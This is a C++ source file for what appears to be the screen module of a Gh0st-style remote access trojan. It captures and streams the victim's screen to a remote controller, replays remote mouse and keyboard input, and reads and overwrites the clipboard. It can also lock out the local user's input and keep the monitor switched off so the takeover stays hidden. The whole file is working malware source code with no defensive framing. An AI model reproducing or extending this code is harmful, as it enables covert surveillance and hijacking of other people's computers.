// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////
#include "ScreenManager.h"
//#include <winable.h> // BlockInput
#include "..\until.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;
	m_biBitCount = 8;
	m_pScreenSpy = new CScreenSpy(8);
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;

	dwmapiDllHandle = LoadLibrary(_T("dwmapi.dll"));  

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL);
}

CScreenManager::~CScreenManager()
{
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, FALSE);
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);

	if (m_pScreenSpy)
		delete m_pScreenSpy;
	m_pScreenSpy = NULL;

	if(dwmapiDllHandle)
		FreeLibrary(dwmapiDllHandle);
}

void CScreenManager::ResetScreen(int biBitCount)
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

	delete m_pScreenSpy;
	m_pScreenSpy = NULL;

	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = true;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}



void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
 	try
 	{
 		switch (lpBuffer[0])
 		{
		case COMMAND_NEXT:
			// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_ALGORITHM_RESET:
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_CONTROL:
			{
				// 远程仍然可以操作
				BlockInput(FALSE);
				ProcessCommand(lpBuffer + 1, nSize - 1);
				BlockInput(m_bIsBlockInput);
			}
			break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		case COMMAND_DISABLE_AERO:
			DisableAeroTheme(lpBuffer[1]);
			break;
		default:
			break;
		}
 	}
	catch(...)
 	{
 	}
}
 
HRESULT CScreenManager::DisableAeroTheme(BOOL bStatus)
{
    typedef HRESULT (WINAPI * DwmEnableCompositionFunction)(__in UINT uCompositionAction);

	HRESULT aResult = S_OK;

	if (NULL != dwmapiDllHandle ) // not on Vista/Windows7 so no aero so no need to account for aero.
	{
		DwmEnableCompositionFunction DwmEnableComposition;
		DwmEnableComposition = (DwmEnableCompositionFunction) ::GetProcAddress(dwmapiDllHandle, "DwmEnableComposition");
		if( NULL != DwmEnableComposition )
		{
			aResult = DwmEnableComposition(bStatus);
		}
	// FreeLibrary(dwmapiDllHandle); 
	}
	return aResult;
}

void CScreenManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);	
}

void CScreenManager::sendFirstScreen()
{
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;

	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void CScreenManager::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	
	if (dwBytes == 0 || !lpNetScreen)
		return;

	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);

	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;
}

DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;

	pThis->sendBITMAPINFO();
	// 等控制端对话框打开

	pThis->WaitForDialogOpen();

	DWORDLONG i = 0;
	pThis->sendFirstScreen();
	try // 控制端强制关闭时会出错
    {
		while (pThis->m_bIsWorking)
		{
			pThis->sendNextScreen();
			Sleep(10);
		}
	}catch(...){};

	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
{
	static	bool bIsScreenBlanked = false;
	CScreenManager *pThis = (CScreenManager *)lparam;
	while (pThis->IsConnect())
	{
		// 加快反应速度
// 		for (int i = 0; i < 100; i++)
// 		{
// 			if (pThis->IsConnect())
// 			{
// 				// 分辨率大小改变了
// 				if (pThis->IsMetricsChange())
// 					pThis->ResetScreen(pThis->GetCurrentPixelBits());
// 				Sleep(10);
// 			}
// 			else
// 				break;
// 		}
		if (pThis->m_bIsBlankScreen)
		{
		/* 函数解释：
		SendMessage 进队消息，将消息放入与创建窗口的线程相关联
		的消息队列后立即返回。
		PostMessage 不进队消息，将消息直接发送给窗口，窗口过程
		处理完消息后才返回。
		WM_SYSCOMMAND 窗口消息_系统指令
		WM_MONITORPOWER 系统指令_显示器电源
		
		  最后一个参数含义：
		  2 关闭显示器 the display is being shut off
		  1 低电状态   the display is going to low power
		  -1 打开显示器 the display is powering on
		  
			
			  HDC hdc = GetDC(0);
			  SelectObject(hdc,GetStockObject(BLACK_BRUSH));
			  while(Rectangle(hdc,0,0,2000,2000));
			*/
	
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else if (bIsScreenBlanked)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			bIsScreenBlanked = false;
		}
		if (pThis->m_bIsBlockInput)
			BlockInput(pThis->m_bIsBlockInput);

		// 分辨率大小改变了
		if (pThis->IsMetricsChange())
			pThis->ResetScreen(pThis->GetCurrentPixelBits());

		Sleep(10);
	}

	BlockInput(false);
	return -1;
}

#if !defined(WM_MOUSEWHEEL)
#define WM_MOUSEWHEEL 0x020A
#endif
#if !defined(GET_WHEEL_DELTA_WPARAM)
#define GET_WHEEL_DELTA_WPARAM(wParam) ((short)HIWORD(wParam))
#endif

void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
{
	// 数据包不合法
	if (nSize % sizeof(MSG) != 0)
		return;
	
	SwitchInputDesktop();

	// 命令个数
	int	nCount = nSize / sizeof(MSG);

	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
			case WM_LBUTTONDOWN:
			case WM_LBUTTONUP:
			case WM_RBUTTONDOWN:
			case WM_RBUTTONUP:
			case WM_MOUSEMOVE:
			case WM_LBUTTONDBLCLK:
			case WM_RBUTTONDBLCLK:
			case WM_MBUTTONDOWN:
			case WM_MBUTTONUP:
				{
					POINT point;
					point.x = LOWORD(pMsg->lParam);
					point.y = HIWORD(pMsg->lParam);

					SetCursorPos(point.x, point.y);
					
					SetCapture(WindowFromPoint(point));

					/*

					int m_nLowpowerTimeout =30*60*1000;
					int m_nPoweroffTimeout =30*60*1000;
					//////////////////////////////////////////不知道为什么在XP下使用SendInput会进入屏保，于是加个禁用屏保，和禁用电源管理
					SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, FALSE, NULL, 0);
					SystemParametersInfo(SPI_GETLOWPOWERTIMEOUT, 0, &m_nLowpowerTimeout, 0);
					SystemParametersInfo(SPI_GETPOWEROFFTIMEOUT, 0, &m_nPoweroffTimeout, 0);
					SystemParametersInfo(SPI_SETLOWPOWERTIMEOUT, 0, NULL, 0);
					SystemParametersInfo(SPI_SETPOWEROFFTIMEOUT, 0, NULL, 0);
					/////////////////////////////////////////////////////////////////////////////////////
					POINT point;
					INPUT inp;
					long g_scrx,g_scry;
					g_scrx=GetSystemMetrics(SM_CXSCREEN);
					g_scry=GetSystemMetrics(SM_CYSCREEN);
					g_scrx=(65535/g_scrx);
					g_scry=(65535/g_scry);
					point.x = LOWORD(pMsg->lParam);
					point.y = HIWORD(pMsg->lParam);
					INPUT input;
					input.type = INPUT_MOUSE;
					input.mi.dx = g_scrx*point.x ;
					input.mi.dy = g_scry*point.y ;
					input.mi.mouseData = 0;
					input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
					SendInput(1,&input,sizeof(INPUT));
					
				*/
				}
				break;
			default:
				break;
		}

		switch(pMsg->message)
		{
			case WM_LBUTTONDOWN:
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				break;
			case WM_LBUTTONUP:
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				break;
			case WM_RBUTTONDOWN:
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				break;
			case WM_RBUTTONUP:
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				break;
 			case WM_LBUTTONDBLCLK:
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 				break;
 			case WM_RBUTTONDBLCLK:
 				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONDOWN:
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONUP:
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
				break;
			case WM_MOUSEWHEEL:
				mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
				break;
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
				break;	
			case WM_KEYUP:
			case WM_SYSKEYUP:
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
				break;
			default:
				break;
		}
	}	
}

void CScreenManager::UpdateLocalClipboard( char *buf, int len )
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) 
	{ 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


// 屏幕分辨率是否发生改变
bool CScreenManager::IsMetricsChange()
{
	if (m_pScreenSpy == NULL)
	{
		return false;
	}
	LPBITMAPINFO	lpbmi =	m_pScreenSpy->getBI();

	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) || 
		(lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
}

BOOL CScreenManager::IsConnect()
{
	return m_pClient->IsRunning();
}

int CScreenManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}